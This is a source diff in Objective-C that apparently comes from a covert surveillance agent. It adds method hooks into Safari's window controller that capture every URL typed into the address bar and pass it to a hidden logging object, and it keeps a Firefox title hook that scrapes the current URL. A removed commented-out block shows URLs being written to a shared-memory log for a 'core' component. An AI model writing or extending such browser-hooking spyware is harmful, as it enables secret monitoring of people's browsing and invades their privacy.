@@ -29,6 +29,7 @@ static NSString *gPrevURL     = nil;
 static BOOL gIsSnapshotActive = NO;
 static u_int gSnapID          = 0;
 
+static uint8_t gStopLog       = 0;
 
 void logSnapshot(NSData *imageData, int browserType)
 {
@@ -551,6 +552,65 @@ void URLStartAgent()
 
 @implementation myBrowserWindowController
 
+- (void)didSelectTabViewItemHook
+{
+#ifdef DEBUG_URL
+  infoLog(@"");
+#endif
+  gStopLog = 1;
+  [self didSelectTabViewItemHook];
+}
+
+- (void)closeCurrentTabHook: (id)arg1
+{
+#ifdef DEBUG_URL
+  infoLog(@"");
+#endif
+  gStopLog = 1;
+  [self closeCurrentTabHook: arg1];
+}
+
+- (BOOL)_setLocationFieldTextHook: (id)arg1
+{
+  BOOL res = [self _setLocationFieldTextHook: arg1];
+  
+  if (gStopLog == 1)
+    {
+#ifdef DEBUG_URL
+      warnLog(@"They say I shouldn't log this...");
+#endif
+      gStopLog = 0;
+      return res;
+    }
+
+  if (arg1 == nil || [arg1 length] == 0)
+    {
+#ifdef DEBUG_URL
+      warnLog(@"Empty URL");
+#endif
+    
+      return res;
+    }
+  
+  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
+  NSString *_url   = [arg1 copy];
+  
+  myLoggingObject *logObject = [[myLoggingObject alloc] init];
+  
+  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
+                           _agent, @"agent", nil];
+  
+  [NSThread detachNewThreadSelector: @selector(logURL:)
+                           toTarget: logObject
+                         withObject: urlDict];
+  
+  [logObject release];
+  [_agent release];
+  [_url release];
+
+  return res;
+}
+
 - (void)webFrameLoadCommittedHook: (id)arg1
 {
   [self webFrameLoadCommittedHook: arg1];
@@ -582,50 +642,6 @@ void URLStartAgent()
 
 @end
 
-/*
-@implementation NSTextField (safariHook)
-
-- (void)textDidEndEditingHook: (NSNotification *)aNotification
-{
-  [self textDidEndEditingHook: (aNotification)];
-#ifdef DEBUG_URL
-  infoLog(@"Delegate: %@", [self delegate]);
-#endif
-  NSURL *_url = [[self delegate] _locationFieldURL];
-  NSString *url = [_url absoluteString];
-  NSData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
-  
-  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
-  shMemoryHeader->agentID = AGENT_URL;
-  shMemoryHeader->direction = D_TO_CORE;
-
-  shMemoryHeader->commandDataSize = [url lengthOfBytesUsingEncoding: NSUTF8StringEncoding];
-  strncpy(shMemoryHeader->commandData, [url UTF8String] , shMemoryHeader->commandDataSize);
-#ifdef DEBUG_URL
-  infoLog(@"logData: %@", logData);
-#endif
-
-  if ([mSharedMemoryLogging writeMemory: logData
-                                 offset: OFFT_URL
-                          fromComponent: COMP_AGENT] == TRUE)
-    {
-#ifdef DEBUG_URL
-      infoLog(@"Logged: %@", url);
-#endif
-    }
-  else
-    infoLog(@"Error while logging url to shared memory");
-  
-  [logData release];
-  
-  //if ([[self delegate] _locationFieldTextIsLocationFieldURL] == YES)
-}
-
-@end
-
-typedef char* get_url_t(); 
-*/
-
 extern char *get_url32();
 extern char *get_url64();
 
@@ -634,28 +650,28 @@ extern char *get_url64();
 - (void)setTitleHook:(NSString *)title
 {
   [self setTitleHook: (title)];
-  
-// Disable for 32bit browser
+
+  // Disable for 32bit browser
 #ifdef __x86_64__
 
 #ifdef DEBUG_URL
   infoLog(@"firefox setTitle: '%@'", title);
 #endif
 
-  char* ff_url = get_url32();
+  char *ff_url = get_url32();
 
   if(ff_url == NULL)
     {
       // Try to get url on 64bit headers
       ff_url = get_url64();
-      
+
       if (ff_url == NULL) 
-      {
+        {
 #ifdef DEBUG_URL     
-        NSLog(@"Cannot get _url");
+          NSLog(@"Cannot get _url");
 #endif      
-        return;
-      }
+          return;
+        }
     }
 
 #ifdef DEBUG_URL
@@ -670,13 +686,13 @@ extern char *get_url64();
 #ifdef DEBUG_URL     
   NSLog(@"get urlDict: %@", urlDict);
 #endif
-  
+
   myLoggingObject *logObject = [[myLoggingObject alloc] init];
-  
+
   [NSThread detachNewThreadSelector: @selector(logURL:)
                            toTarget: logObject
                          withObject: urlDict];
-  
+
   [logObject release];
   [_agent release];
   [_url release];
@@ -685,4 +701,3 @@ extern char *get_url64();
 }
 
 @end
-
